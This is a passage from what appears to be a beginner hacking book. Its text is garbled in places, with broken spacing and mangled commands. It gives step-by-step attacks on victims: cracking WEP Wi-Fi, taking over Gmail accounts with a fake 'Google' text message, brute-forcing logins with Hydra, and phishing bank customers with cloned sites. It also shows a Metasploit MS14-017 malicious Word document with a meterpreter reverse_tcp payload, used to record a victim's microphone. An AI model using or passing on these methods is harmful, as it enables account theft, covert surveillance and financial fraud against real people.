CCNA  and  after  you  get  them  you  should  increase  your  status  and move  up  to  admin  role.  Next,  you  should  invest  some  time  into  getting security  certifications  like  TICSA,  CISSP  and  Security+  and  progress  in your  career  by  taking  an  information  security  position.  After  you’ve  got  your  position  it’s  recommended  to  focus  on  penetration  testing  and  experience  the  tool  of  trade.  The  next  step  is  getting  e  Certified  Ethical  Hacker   CEH   certification  offered  by  the  International  Council  of  Electronic Commerce Consultants  EC-Council for short  and the last step  after  you  have  got  all  the  above  is  recommending  yourself  as  an  ethical  hacker. Don’t forget about the programming and data bases such as SQL!   You will also need good communication skills, fast problem solving skills  and a strong work ethic because hacking isn’t all technical and you have to  be  powered  by  your  own  motivation  and  dedication.  Legality  is  another  important  aspect  we  should  take  in  consideration  if  we  talk  about  ethical hacking because you aren’t legal anymore if you attack someone’s network without their full permission, there are some tests you will be under if you take this job like polygraph tests and basic background tests. It’s only one code from legal to illegal so be very careful because getting into black hat hacking  will  totally  destroy  your  ethical  hacking  career,  stay  away  from illegal activities as much as you can. I  have  to  pick  your  attention  again  about  becoming  a  Certified  Ethical Hacker  CEH  because this certification is very important and helpful in the same time, it will set your mind and make it a hacker mind by helping you understand better what security is about. They will teach you the most used types  of  exploits,  vulnerabilities,  and  countermeasures.  After  getting  the certification  you  will  be  able  to  do  operations  like  cracking  wireless encryption, creating Trojan horses, backdoors, viruses, and worms and you will  find  out  how  to  hijack  web  servers  and  web  applications  despite  the fact  that  you  will  be  a  pro  in  penetration  testing,  social  engineering  and footprinting. Furthermore, you can take online training and courses live and you  can  work  with  self-study  materials  but  in  addition  The  EC-Council requires a minimum of two years of information-security experience. One of  the  most  popular  figures  in  ethical  hacking  is  Ankit  Fadia,  an  Indian ethical  hacker  and  he  has  written  over  ten  books  about  computer engineering and hacking and the first one was written when he was only 15   years  ,  those  books  are  highly  appreciated  by  professionals.  Fadia  is currently  working  as  a  computer  security  consultant.  Another  famous Indian ethical hacker is Rahul Tyagi who is an actor and hacker at the same time. Network hacking is another common used type of hacking and it basically means  assembling  information  about  something  by  using  tools  and  Port Scanning, Port Surfing and OS Fingerprinting by using another tools. Tools usually  used  in  network  hacking  are  Ping,  Telnet,  NslookUp,  Tracert, Netstat,  etc.  Ping  is  used  to  repair  TCP   IP  networks  and  it’s  a  part  of ICMP- Internet Control Message Protocol, Ping is an order that makes you able to test if the host is dead or not. To use ping on a particular host syntax is  looking  like  this  c  : >ping  hostname.com  and  let’s  take  as  an  example Google: c: >ping www.google.com  and  the  command  prompt  will  be  like this: C:\>ping www.google.com Pinging www.l.google.com [209.85.153.104] with 32 bytes of data: Reply from 209.85.153.104:  bytes= 32  time=81ms  TTL=248  Reply from 209.85.153.104:  bytes= 32  time=81ms  TTL=248 Reply from 209.85.153.104:  bytes= 32  time=81ms  TTL=248 Reply from 209.85.153.104:  bytes= 32  time=81ms  TTL=248   Ping statistics for 209.85.153.104: Packets: sent = 4 , received = 4 , lost = 0   , Approximate round trips times in milli-seconds : Minimum = 81ms, Maximum = 84ms , Average = 82ms Netstat  shows  you  current  TCP IP  network  connections  and  protocol statistics. It can be used with the syntax at command prompt : c: >Netstat-n and the command prompt will display : C:\>Netstat-n Active connections : ProtoLocal address  Foreign accessState    TCP 117.200.160.151 :2170209.85.153.104 :80  Established TCP117.200.160.151 :2172209.85.153.104 :80  Time_Wait TCP  117.200.160.151 :2174209.85.153.104 :80 Established TCP  117.200.160.151 :2176209.85.153.104 :80 Established   TCP127.0.0.1 :1042127.0.0.1 :1043  Established   Telnet  is  another  tool  which  runs  on  TCP IP.  It  is  used  to  connect  to  the remote  computer  or  particular  port  .  Its  basic  syntax  is  :  c: >telnet hostname.com and the complete syntax when it connects to port 23 of the computer is: c: >telnet hostname.com port. Example: c: >telnet 192.168.0.5 21 or c: >telnet www.yahoo.com 21   Tracert is another tool used by network hackers and its tracing out the route taken  by  the  information.  Tracert  syntax:  c: >tracert  www.hostname.com   let’s take as example www.insecure.in : C: >tracert www.insecure.in Command prompt will display: C:\>tracert www.insecure.in Tracing route to insecure.in  [174.133.223.2]  Over a maximum of 30 hops: 1  29ms 30ms 29ms  117.200.160.1 2  31ms 29ms 29ms  218.248.174.6  3 * * * Request timed out 4 694ms  666ms  657ms125.16.156.17 5 644ms  656ms  680ms125.21.167.70  6 702ms  686ms  658msp4-1-0-1.r03.lsanca03.us.bb.gin.ntt.net 7 682ms  710ms 703msxe-3-3-0.r21.lsanca03.us.bb.gin.ntt.net 8676ms692ms707msas-0.r21.hstntx01.us.bb.gin.nnt.net 9 748ms837ms828msxe-4-3.r03.hstntx01.us.bb.gin.nnt.net 10717ms721ms722ms xe-4-4.r03.hstntx01.us.ce.hin.nnt.net   11695ms701ms712ms  po2.car07.hstntx2.theplanet.com 12726ms697ms688ms 2.df.85ae.static.theplanet.com Trace complete.  Network Hacking    Despite  the  hackers,  there  are  “occasional”  hackers  who  are  using  the  network hacking to crack wireless passwords because internet connections  are a necessity in our lives but how is a wireless network secured? In case  of secured wireless connections, encrypted packets represent internet data  under another form. Packets are encrypted with network security keys and  basically  if  you  want  to  have  access  to  internet  wireless  connection  then  you  should  have  the  security  key  for  that  particular  wireless  connection.   There are two types of encryptions in use WEP  Wired Equivalent Privacy  and  WPA   Wi-Fi  Protected  Access ,  WEP  is  the  fundamental  encryption and a very small number of people use it because it’s very unsafe and it can be cracked very easy. WPA is the more secure option, WPA-2 is the most secure encryption of all time and you can crack a Wi-Fi Protected Access network then you will need a wordlist with common passwords but it can be unbreakable if the administrator is using a complex password and because a lot  of  people  are  interested  in  breaking  Wi-Fi  protected  connections,  this book  is  going  to  show  you  how  to  do  it.  You  will  need  a  compatible wireless adapter, CommView for Wi-Fi, Aircrack-ng GUI and a big bag full of  patience.  This  operation  is  impossible  without  a  compatible  wireless adapter,  your  wireless  card  must  be  compatible  with  the  software CommView,  software  used  for  capturing  the  packets  from  the  network adapter, and you can download the software from their website. Aircrack-ng GUI is practically doing the crack after capturing the packets. Don’t  forget  two  main  things  before  starting:  select  the  network  with  the highest signal and remember that every network has its details in the right column, not in the left column. Set up CommView and choose your target network, select it and double click on “capture” with CommView and the software will start collecting packets from the selected channel. If you want to capture packets only from the target network then right click on the target network and copy the MAC address, on the top change to Rules tab, on the left pick MAC addresses and enable them.   Once  you  have  done  this,  select  the  option  capture  and  for  ‘add  record’ please  select  both  and  paste  the  copied  addresses  in  the  displayed  box. Enable auto saving in the logging tab, set MDS  Maximum Directory Size  to 2000 and ALFS  Average Log File Size  to 20. And you are at the point where you should use your patience and wait until at least 100,000 packets are  captured  and  export  them  by  going  in  the  log  tab  and  selecting concatenate logs and select everything that has been saved and don’t forget to keep CommView open, take a walk to the folder where you have saved the  concatenated  logs  and  open  it  and  click  on  File-  Export  -Wire  shark tcpdump  format  and  chose  any  destination,  after  doing  this  logs  will  be saved with .cap extension. Next, open Aircrack-ng and there you will find a zip file, extract it and open it and navigate to ‘bin’, now run the software and choose WEP. Remember the file you saved earlier .cap? Click ‘launch’ and in the command prompt write  the  parameter  number  of  your  desired  network  and  wait  for  a  few seconds. Enjoy the internet now!  Email Hacking  The fourth type of hacking is email hacking and in this type hackers attempt to an email address without permission. The electronic mail is more used than the traditional mail boxes and that’s due to the evolution, emails are used today mostly as a form of communication due to its options. There are two types of services web-based: an email service which is open-based and that means this type deliver email accounts to any customer, some of them are for free but some request fees and the other type give email accounts controlled  and  organized  by  companies  for  employees,  and  in  general students  and  members  only.  There  are  three  big  forms  of  attacks:  spam, virus or phishing. The  first  type  of  attack  is  realized  by  delivering  huge  email  broadcasts which  contains  a  hidden  IP  address  or  email  addresses,  a  spam  message usually contains something very attractive such as low-priced travel tickets, job  offers  and  in  general  any  kind  of  offers  and  to  be  more  attractive spammers  use  a  lot  of  colors  and  photos.  Some  of  the  hack  victims  may open the magic message, read it and get really interested in its content.   The  big  fun  for  hackers  is  when  they  hit  a  big  company  and  hold  their sending  email  and  IP  address.  If  the  masters  of  email  hacking  choose  a company  and  hack  it  the  company  would  be  destroyed  and  their  internet connection  would  be  down  and  stopped  by  its  Internet  Service  Provider  ISP  and none of their emails would reach the destinations. Another method used by hackers to get unauthorized access into someone’s email is by sending them an email that hides a virus in the background, the Sobig  virus  is  often  used  because  it’s  a  modern  technology  that  creates  a spamming  infrastructure  because  it’s  taking  over  unwilling  PC  members. The third way hackers follow to hack and email is called phishing and it consist of collecting sensible and valuable information from others emails such as credit card numbers, user names and passwords and many hackers use this method to get money. The risk of being hacked by phishing is very high in those days especially on Facebook and Twitter where you give some precious  information  about  your  person,  social  media  is  not  as  kind  as  it seems and there are a lot of well hidden secrets behind them. There are three types of phishing, the first type is known as Spear Phishing and it’s used to attack target people, companies and organizations, 91% of email  attacks  are  made  with  this  kind  of  phishing  and  most  of  them  are successful. The next phishing type is called Clone Phishing and its adepts clone  emails  by  creating  identical  ones  and  the  last  type  of  phishing  is known  as  Whaling,  people  use  this  term  to  describe  a  high  profile  attack made using phishing method.   An  interesting  way  to  hack  someone’s  account  you  can  apply  only  by knowing  his her  phone  number,  let  me  explain  how,  when  a  person  is making a new email address its recommended to attach their phone number for security reasons and in case you forget your email password you can set a new one if you add your phone number, so most of the people add their phone numbers. It’s enough to know your victim’s phone number and email address to start. First, go to the login page and type the email where they ask you to do it and after that select the ‘’need help?’’ option and select "Get a verification code on my phone: [mobile phone number]" and the sms will be sent to the phone number, the sms usually is formed from six letters. After that, you   should send a message to the person’s number pretending you are Google and the message should be "Google has detected unusual activity on your account. Please respond with the code sent to your mobile device to stop unauthorized  activity.”  the  victim  will  believe  this  message  and  send  you the verification code which you will enter lately. After entering the code set up  a  new  password  and  we  are  done,  check  everything  you  want  on  that account. *Note:  this  method  works  only  with  Gmail  accounts  and  it  will  be successful if the victim doesn’t know your number, in case the number is known by the victim try to send the message from an unknown number. Every  one  of  us  must  take  measures  immediately  to  protect  our  email addresses,  a  big  company  like  Yahoo!,  Gmail  or  Hotmail  treat  their customers with curiosity by offering them high security, each one of them will  notify  you  immediately  if  there  is  something  strange  and  ask  you  to check your email or set up your password. Another  good  idea  is  to  make  a  complicated  email  address  with  numbers but  make  sure  you  don’t  forget  it!  Also  you  should  choose  a  complex password with numbers and big and small letters  I recommend creating a password with more than 12 characters . Your computer should be protected as  well,  make  sure  you  get  a  professional,  original  and  high  quality antivirus software like Avira or Avast, they might offer you a short testing period and after that they will ask you to buy it, do it, it totally worth! Even a hacker should protect his computer because you never know what could happen in the next second. Choosing a difficult security question will increase your security rate but be careful; you should remember the answer even after ten years or more if it’s needed, this option could save your email’s life because no one will be able to surf the internet in hope to find something very personal about you. However, email hackers have a lot of success those days by simply getting into more and more email accounts ….  Password Hacking  Another type of hacking is password hacking and some of the people also call  it  password  cracking,  the  hunted  people  are  usually  celebrities,   to  study  website  sales  material  and  even   government people or ‘’too loved’’ persons or they could be simple persons who forgot their passwords and want them back so they recover them by hacking their own accounts. A password hacker is using all his intellectual and practical power to solve the problem and not by guessing the password because  this  is  something  that  an  unspecialized  person  would  do,  not  a master of hacking. So do you think your password is secure? Think again about this. So, password hacking is a method to recover your own password from data transmitted by or stored on a computer, or you it can be a method to get someone’s else password without asking for it. In fact, password hacking is about you passwords and other’s passwords that protect their important or valuable data. There are some famous techniques to hack a password such as dictionary attack, brute force attack, rainbow table attack, phishing is used also here, social  engineering,  malware,  offline  hacking,  spidering  and  shoulder surfing. Because of the spidering method hackers gave a small piece of their time  the  websites  of competitors  and  corporate  literature  because  they  released  that  passwords are combinations of words linked to those domains so they got inspired and created  a  personalized  word  list  to  let  them  get  access  to  the  secured information  easier.  The  other  hackers  who  don’t  have  too  much  time  to spend reading, there is an application that can do that replacing your work. Dictionary  attacks  are  based  on  most  used  words  as  passwords  and  this method  is  using  simple  files  which  contain  words  that  can  be  found  in  a dictionary. If you are going to hack by rainbow table attack you will need a lot of RAM because  the  file  is  about  four  Gigabytes   GB ,  a  rainbow  table  is  a  pre- calculated list of hashes and is working by listing permutations of encrypted passwords  specific  to  a  given  hash  algorithm.  This  method  is  one  of  the fastest methods of hacking because in average is only 160 seconds to break a 14-character alphanumeric password, but don’t forget that a big part of the process depends on the software. As in email hacking, phishing is used in password hacking as well because it’s one of the easiest ways to hack by sending an email under different institution’s identities asking them to give you their password, and you have big chances to win if you are going to   choose  this  method  of  hacking.  Even  more  than  that,  there  is  a  social engineering which is taking the above concept outside the inbox, you would be really surprised how much this works the only thing you have to do is to pose as an IT security agent and simply ask for the passwords under a fake identity of course, some of the hackers do this face to face making a false identity document before. Brute force attacks are also known as exhaustive key search and they are attacks  against  encrypted  data  but  an  exception  is  data  encrypted  in  an information-theoretically secure manner, this method is similar to dictionary attack  method  and  it’s  not  a  quick  way  to  hack  a  password,  it’s  a  great method to hack short passwords even if they have got numbers in them but there are some encryptions that could not be given up by brute force due to their  mathematical  proprieties  and  complicated  algorithms.  You  can  use software  such  as  Hashcat,  John  the  Ripper,  Aircrack-ng,  Cain  and  Abel, Crack,  SAMInside,  Rainbowcrack,  L0phtcrack,  Hash  code  cracker, DaveGrohl and Ophcrack to hack passwords with this method. And here is an example using Hydra: root@find:~ Desktop hydra -t 10 -V -f -l root -x 4:6:a ftp:  192.168.67.132   Malware is such a great and enjoyable method to hack passwords because it’s  not  taking  a  bi  amount  of  effort,  malware  can  install  key  loggers  or screen scrappers that collects everything you write and if you want to it can make  print  screens  while  a  person  is  logging  in  and  then  sends  by forwarding a copy of the file to you. A recent research is showing that over 45,000  Facebook  accounts  have  been  hacked  using  malware.  Malware  is great  because  despite  the  fact  that  is  helping  you  hack  a  password  it  can disrupt  computer  operations  and  win  access  to  private  computer  systems. Malware is the contraction for malicious software. Shoulder  Surfing  it  is  the  most  used  method  to  collect  pass  codes  from ATM machines and credit cards and it is realized running your eyes over a person’s shoulder to visually collect what that person is typing. Offline hacking is also a nice method to hack passwords used by hackers, hackers can take full advantage of this method because they can do it in a   really  quick  time,  by  using  this  method  you  will  be  able  to  take  the password  hashes  out  of  the  local  SAM  file  and  hack  the  selected  hashes using methods like Dictionary or Rainbow table but to be capable of doing this  operation  you  should  download  and  install  Cain  and  Abel  software. This kind of attack is only possible when you have the password hashes and  its way more well than online attacks due to the main difference between  them which is the speed you can hack a password.   Just to get some training I recommend trying both online and offline attacks because they are very different and if you are doing it for the first time it could be one of your life challenges. Sometimes you won’t get the result you want to only trying once, but never give up and think about the best solutions! Make sure you have all the comfort conditions you need when you do such operations because they need a lot of patience and attention. Let’s  make  an  imagination  exercise  and  believe  for  a  moment  that  there aren’t  any  passwords  to  break  and  everything  is  free,  wouldn’t  it  be  too boring? Those skills will help you reach your goals and it is fun to try each one of them. But if you want something more professional to hack a password, then this book is the right one for you because below you will fin out how to hack a password  using  THC-Hydra  but  you  will  need  to  download  and  run  Kali distribution in order to get this tool installed. The first step in hacking passwords using THC-Hydra is downloading and installing another tool which is an extension of Firefox and it gives you the capability  to  keep  and or  change  the  outgoing  HTTP  requests  and  it  is called “Tamper Data “, it was one of the best hidden secrets of the hackers … until now, this tool is easy to use because it is well built and it allows you  to  post  information  too.  After  you  download  it  please  install  it  into Iceweasel which is a browser in Kali. Once you do the above carefully, please move to the next step by testing Tamper Data by activating the tool into your browser and start surfing the internet randomly. Tamper Data must provide you with each HTTPS GET and POST request between your browser and the server, if the tool is doing this then you can successfully follow the next step.   The next step consists in opening THC Hydra after you installed and tested Tamper Data, you can open Hydra by accessing Kali Linux, selecting the option password and the computer will display Online Attacks option, click  on it and select Hydra.   Once you open Hydra, you can notice Hydra’s syntax root@kali:~ ,Hydra  will welcome with a help screen which looks like:       OPT some service modules support additional input  -U for module help  Supported  services:  asterisk  afp  cisco  cisco-enable  cvs  firebird  ftp  ftps http[s ]-{head  get} http[s]-{get  post}-from http-proxy-urlenum icq imap[s] irc ldap2[s]  ldap3[ - {cram digest}md5] [s] mssql ncp nntp oracle-listener ora cle-sid pcanywhere pcnfs pop3[s] postgres rpd rexec rlogin rsh s7-300 sip smb smpt[s]  smtp-enum  snmp  socks5  ssh  sshkey  svn  teamspeak  telnet[s] vmauthd vnc xmpp   Hydra  is  a  tool  to  guess crack  valid  login password  pairs  –  usage  only allowed for legal purpose. This tool is licensed under AGPL v3.0. The newest version is always available at http:  www.thc.org thc-hydra These services were not compiled in: sapr3 oracle.   Use  HYDRA_PROXY  or  HYDRA_PROXY  –  and  HYDRA_PROXY_AUTH – environment for a proxy setup. E.g.: %export HYDRA_PROXY=socks5:  127.0.01: 19150 or  socks4:   or connect :      %export HYDRA_PROXY HTTP=http:  proxy:8080   %export HYDRA_PROXY_AUTH=user: pass    if  needed   -p          –   hydra   admin   In Hydra, the username can be “user” or “admin” or maybe “person”, the username  is  a  single  word  usually  and  passwordlist  is  a  file  that  it’s containing possible passwords and target indicates the IP address and port. And  the  last  step  is  using  Hydra  to  hack  passwords  like  in  the  following example: root@kali: usr share wordlists  l   usr share wordlists rockyou.txt  192.168.89.19080  Above I just hacked the ‘admin’ password using the wordlist “rockyou.txt”  at 192.168.89.190  port 80.   Take full advantage of using Hydra and use it on Web Forms too, Hydra’s syntax  using  a  web  form  is   : :   and Tamper Data will help you by providing important information. *Note: Useful Hydra dictionary: -t = how many parallel attempt at a moment  1 5 10 100?  -P = dictionary file -f = stop when found the password -v = show output -I = username There  are  other  famous  tools  used  for  password  hacking  except  the  one mentioned, tools such as Medusa, Wfuzz and Brutus. Brutus is one of the most used tools for password hacking because recent studies are showing that it’s the most flexible and the fastest tool used in this type of hacking, only works on Windows system and it is on market since October, 2000 and it is totally free. Medusa  is  similar  to  Hydra  and  it’s  supporting  HTTP,  FTP,  CVS,  AFP, IMAP, MS SQL, MYSQL, NNTP, NCP, POP3, PostgreSQL, pcAnywhere, rlogin, rsh, SMB, SMTP, SNMP, SSH, SVN and VNC. This tool is capable to  check  approximately  2000  passwords  per  minute  if  the  network connectivity is good, but before you start using it take a close look to the commands because this is a command line tool and try to learn them.   Wfuzz is also a tool used by password hackers with brute force, you can use it to discover hidden sources such as scripts and servlets. Wfuzz is a little bit  different  because  it  has  the  capability  to  identify  injections  like  SQL Injection, LDAP Injection and XSS Injection. Why to choose Wfuzz? It’s simple, you should choose it for those reasons: It  can  brute  force  HTTP  password,  it  has  multiple  proxy  support,  it  can inject  via  multiple  points  and  post  headers  and  authentication  data  using brute force. Each of the mentioned tools are great and helpful in password hacking, a real hacker must try them all and then choose a favorite tool to use in his next password hacking attacks because every tool is special in a different  way and even if they seem to do the same things, if you give some time to  try and analyze each of them you will see that they are different from each  other even if the main idea is practically the same, they were all created to  do the same thing : to help hackers do their job better.   Investing in your person is the best kind of investment you could ever make and that’s because you are always gaining something that you can lose after a  period  of  time,  you  gain  experience  and  you  exercise  your  brain  at  the highest levels by trying every new feature and exploring it, by making new connections and creating new solutions. Also, a hacker knows mostly everything about all the types of hacking so he  prefer  quality  over  quantity  and  is  always  investing  in  new  high  staple  software  that  he  can’t  wait  to  explore  ,  find  the  software  weakness  and  make it even higher quality than before because evolution is infinite.    Computer Hacking  The penultimate type of hacking is represented by Computer hacking which is  a  type  of  hacking  used  by  hackers  to  get  access  to  another  person’s computer  and  control  it  without  the  owner  permission  and  there  are  few operations  performed  on  the  hacked  computer  like  collecting  material  or using it to chat and even access some sensitive files on that computer. Computer  hacking  is  about  changing  the  hardware  and  software  on  the hacked  computer,  reports  show  that  most  of  the  computer  hackers  are teenagers and very young adults but there are as well old aged hackers, as   any other hacking type, computer hacking is considered by hackers a form of art and it not an opportunity to bother others as many people see, in fact, computer hacking is a chance for hackers to prove their abilities and skills. There are famous computer hackers and we should thank them every day  for  their  realizations  because  if  they  weren’t  maybe  the  technology  nowadays  won’t  be  at  this  point,    Dennis  Ritchie  and  Ken  Thompson worked early in the 70’s to create the UNIX operating which highly affected the development of Linux and they were tagged as former hackers. Another important computer hacker is Shawn Fanning who created Napster. There  are  three  methods  to  hack  a  computer  and  the  first  one  is  called Hacking Logins, the second one Remote hacks and the third one is about hacking Wi-Fi. There are few steps to follow in every case. We are going to start with the first method of computer hacking, so the first step is to open your computer and boot it in the safe mode and after doing this wait a couple of seconds until the computer is open, when it’s open in the safe mode please click on Start button and select “run” after that try to write  in  “control  userpasswords2”  and  change  passwords  for  any  other account if there are multiple accounts and at the end of the process don’t forget to restart the fresh hacked computer. The second method is used to hack remotes and the first step in following this  method  of  computer  hacking  is  downloading  and  installing  the LogMeIn software, they will give you a free limited version, this program should be downloaded on the computer you intend to remotely view. You have to make an account on the LogMeIn website to use the free program. When you already own an account on the website, log in and go to the “ My Computers” page in case if it doesn’t open automatically after logging in. The next step is searching for “ Add computer”, click on this button and put there  the  information  of  the  computer  you  intend  to  access  and  the computer  should  be  added  automatically.  Check  if  the  computer  name  is added and click on it if it is there, if not then repeat the below step. For the next  step  you  will  have  to  know  the  username  and  the  password  of  the computer in order to log on it and view the account you want to access and after that select the “Remote Control” option and log out the website once  you satisfied your curiosity.     Computer hackers use another method to get access to your computer and use it. The whole process is realized if hackers know your personal Internet Protocol which is totally unique and any hacker can contact your computer if  they  know  your  IP.  The  first  step  in  this  case  is  downloading  and installing Nmap, a tool used for port scanning and after you have got the Nmap installed you should search by scan option a local computer and after you  did  this  please  scan  your  individual  target,  after  the  scan  you  should notice the open ports. The last step after scanning is banner grabbing and here  you  can  use  the  regular  ol’  telnet  client,  Telnet  has  Linux  and  most Windows distributions:  telnet     and you just tried this method as well. Hackers are creative minds and love to solve problems, one hacker asked himself if there would be no problems and he ended up concluding that he would commit suicide, hacking is so addictive, once you get it right, you never leave it. A  massive  computer  hack  was  made  by  Anonymous  in  2011  when  they broke into the Syrian Leader’s account and accessed more than 78 inboxes of the president’s personal and made it public and accessible to any person . According  to  the  official  sources,  the  hackers  group  didn’t  need  a  lot  of effort to break the email because the president’s password is number two weakest password in the world on an official top, his password was 12345 and it was associated with a couple of his accounts not only the official one, while  the  country  was  on  fire,  hot  news  appeared  due  to  the  Anonymous group of hackers. The  black  hat  hackers  who  have  big  goals  such  as  Anonymous  goal  that later  turned  into  a  big  realization  are  more  than  dangerous  because  by contributing  with  their  creative  mind,  they  have  90%  chances  to  succeed but there is 95% to make other collateral victims of the hack, so think ten times  before  you  take  attitude  and  action  as  a  hacker  because  you  might destroy  other  people  lives  including  your  life  as  well,  once  you  take  a decision and you realize what you decide you can’t erase your own actions, it’s exactly live a famous movie, once is filmed it is never deleted.   As  a  real  hacker,  you  should  act  with  responsibility  and  never  forget  to assume everything you do, even if we are talking about white hat hacking or black hat hacking, both of them request a mature creative mind, not only a  creative  mind  because  little  children  have  also  creative  minds,  but  they don’t became hackers in the most of the cases. Hackers don’t want only to hack your computer, they are doing it because they  want  to  get  deeply  in  your  life,  so  they  decide  to  spy  on  you  by hacking  your  computer.  Due  to  the  computer  technology  spying  is  not anymore  an  action  that  could  be  performed  only  by  agencies  and organizations like CIA, NSA, and KGB because you can do it too if you are a  dedicated  and  motivated  hacker.  This  book  is  going  to  tell  you  how  to transform any computer into a listening device. Start by installing Kali and after that continue by firing it up, you should be able to discredit the computer wanted in order to convert it into a listening device.  After  doing  this,  make  sure  you  are  compromising  the  Remote Computer and one of the greatest way to do it is by sending the computer an email that will get the wanted click on a link or document and inside the document you should embed a listener that will enable you to turn on the microphone on the target computer and collect all the conversations that are made around the computer. To make sure you gain your victim’s attention please select an interesting and exciting subject that would attract the victim immediately, your main goal is earning that magic click. You  should  associate  this  process  with  a  little  bit  of  social  engineering because in most of the cases, hackers know their victims and their weakness so take full benefit and if it’s your business rival then send him an excel or access document, anything the victim might make put interest in. Hackers are just too smart and busy with their stuff and that’s why they would never listen  to  foreign  conversations  between  unknown  people.  You  will  search for an exploit next, you should find a customer who uses the vulnerabilities of Microsoft Word, a few time ago Microsoft posted an official report about their  vulnerability  that  allow  remote  code  execution,  the  file  was  named MS14-017  and  if  you  search  the  web  with  attention  you  will  find exploit windows fileformat ms14_017_rtf, once you found this you should load it into Metaspoilt:   msf >use exploit windows fileformat ms14_017_rtf msf exploit ms14_017_rtf   > After you’ve got it loaded write” info” to find out more interesting stuff Playload information: Space: 375 Description: This  module  creates  a  malicious  RIF  file  that  when  opened  in  vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a list override count field can be modified to treat one structure as another. This bug was originally seen being exploited in the wild  starting  April  2014.  This  module  was  created  by  reversing  a  public malware sample. References: http:  cvdetails.com cve 2014-1761 http:  technet.microsoft.com en-us security bulletin MS14-017 https:  virustotal.com en file e278eef9f4ea1511aa5e368cb0e52a8a6899500 0b8ble6207717d9ed09e8555a analysis    after the computer display the above, select show options msf exploit ms14_017_rtf  > show options Module options  exploit windows  fileformat  ms14_017_rtf : Name Current settingRequiredDescription -------  ----------------- ----------  ------------ FILENAMEmsf.rtfno  The file name.      Exploit target: Id  Name ---------   >   set   the   msf   hacked   system.   0 Microsoft office 2010 SP2 English on Windows 7 SPI English You may notice that this exploit works only on MS 2010, the information we need from the above is FILENAME. After that, create the file you want to send and then set the payload right in the  document  by  sending  the  payload  to  meterpreter  because  it  let  you control  PAYLOAD windows meterpreter reverse_tcp. The next step is setting up LHOST with your own IP address because it is helping you to get notified when the system is used by your victim, end this step by writing "exploit." This will create a file that places the meterpreter on the victim’s system. To  receive  the  connection  back  to  your  system  you  must  open  a  multi- handler connection   msf > use exploit multi handler msf > set PAYLOAD windows meterpreter reverse_tcp After this step please set the LHOST to your internet protocol. Once you created your malicious file send it to your victim and wait until it’s  opened  by  the  victim  on  their  system.  After  the  victim  open  the document she is going to pass a meterpreter session. Use the Metasploit Ruby script that activates the microphone on the hacked computer  and  form  the  meterpreter  prompt  like  this  meterpreter  >  run sound_recorder - l  root. You can find the recordings at your system in a  root directory in a file. The  worst  part  about  this  method  is  that  is  taking  a  huge  amount  of memory, so make sure you prepare your hardware for the operation as well. And  because  hackers  are  helping  technology  to  go  on,  there  are  persons who  take  care  of  the  hackers,  so  they  created  many  sites  where  the  old hackers  can  exercise  their  skills  and  beginners  to  learn  few  things  about hacking This kind of websites are very helpful and you can learn really good stuff at Hacking Tutorial, Evilzone hacking forums, Hack a Day, Hack in the box or   Hack this site!, they are offering training materials and a big range of tips and tricks for hackers, but those kinds of sites won’t make you a master in hacking but you can definitely become one by trying to work on the biggest problems  and  a  great  way  to  challenge  your  mind  is  searching  for  those kind of impossible, unsolved problems and trying to find a solution for each of them. Computer hacking has its legal limits too, it’s ok to do what you like and try everything  in  that  domain  until  you  are  in  prison,  so  while  hacking adrenaline is freaking you out don’t forget that there are people who can’t wait to judge your actions. The  problems  you  will  meet  in  hacking  are  actually  a  reflection  of  real problems in the real life, and real problems in life should be treated with full  seriousness,  attention,  responsibility  and  a  lot  of  knowledge,  it’s  the same procedure in case of hacking, you can’t hack just for fun for a long period of time because by doing it you increase your chances to get a “free trial”  in  the  federal  prison  and  this  would  be  unlikable  to  any  hacker because  without  freedom  you  can’t  do  your  stuff,  you  can’t  access  your materials  and  some  people  are  controlling  your  life,  so  take  care  to  NOT arrive at that point.  Online Banking Hacking  After you learned about different types of hacking, there is a last one to take in consideration and that type of hacking is called Internet Banking Hacking and it’s considered a cyber crime in the most countries of the world. In  the  last  years,  internet  banking  has  become  a  feature  used  by  a  big number  of  people  and  it  has  its  advantages,  but  the  main  disadvantage  is that  once  hackers  get  into  this  type  of  hacking  all  the  money  are  lost. Authorities and expert analyses estimate that in the future years the cases of online  banking  hacking  will  take  a  considerable  growth.  Online  banking exists  since  1980  and  new  methods  to  hack  online  bank  accounts  are appearing everyday. This book will tell you the fundamental methods used in online banking hacking since it appeared. The  first  method  you  can  choose  for  hacking  an  online  bank  account  is phishing, the number of this kind of attacks are growing in the last years   to   to  belong   against  banking  systems,  to  hack  the  victim  you  should  use  social engineering techniques as well. Hackers hide under a bank identity and make their new identity look as real as  possible  pretending  the  bank,  malicious  emails, advertisements and emails are the top secret in getting into someone’s bank account without their permission or knowledge. You  should  adopt  the  typical  phishing  scheme  and  try  to  collect  as  much information as you can about your victim, before anything else you should know  their  email  address  and  if  the  victim  uses  this  address  for  online banking but don’t worry, most of the people do it because it’s a little bit too complicated  to  work  on  couple  emails  at  a  time  and  people  who  choose internet banking are usually busy and they don’t have time to follow more than an email address. So, after you have got the email address, send any email that can get your victim’s  attention  by  opening  that  email,  the  content  of  the  email  can  be something interesting or in this case it’s better to guide your victim though a link  to  a  specialized  website  that  will  ask  for  financial  data  and  security details, those kind of websites are specially designed to look like an official bank account, but is definitely not the original one, those infected websites are designed identical to the original ones. Your email should make the victim click on a link which will guide your victim to a website which perfectly replicates a bank site. Hackers also include in the email attachments which contain the link to the fake website and once opened it has the same effect. Phishing emails should take the official form of notifications and emails of the banks, organizations or  e-payment  systems,  those  kinds  of  messages  request  your  victim’s sensitive information that will help you reach your goal. Malware specially  designed for online banking hacking exist! it’s named Prg Banking Trojan.   McAfee  has  published  a  report  on  phishing  which  indicates  that  hackers aren’t  hacking  small  banks,  their  targets  are  big  companies,  banks  and organization  that  could  worth  the  hack  operation  to  be  done.  37%  of  all banks on the globe were hacked using the phishing method in the last 12 moths at least once.   Hackers  attempt  to  every  sector  by  phishing  it.  Hackers  are  interested  in predominantly  banking,  e-payment  systems,  e-auctions  and  generally  in hacking big financial organizations around the globe. Phishers are focused on breaking into hosting providers and they succeed in most  of  the  cases,  hackers  disgracing  servers  and  update  their  own configuration in order to display phishing pages from a private subdirectory of each domain that the machine host. Don’t  forget  to  protect  yourself  even  if  you  are  trying  to  hack  online accounts, with a little lack of attention you can loose everything as well as your victims. Don’t divulge your Internet Protocol, read carefully every email and don’t click unless you are sure, ask and request more information always in order to keep protected. The second method used by hackers to break into online banking accounts is called Watering Hole and specialists define it as an evolution of phishing attacks. By choosing this option hackers are injecting malicious codes onto a public website visited by a small and standard group of people. In Watering Hole attack, hackers 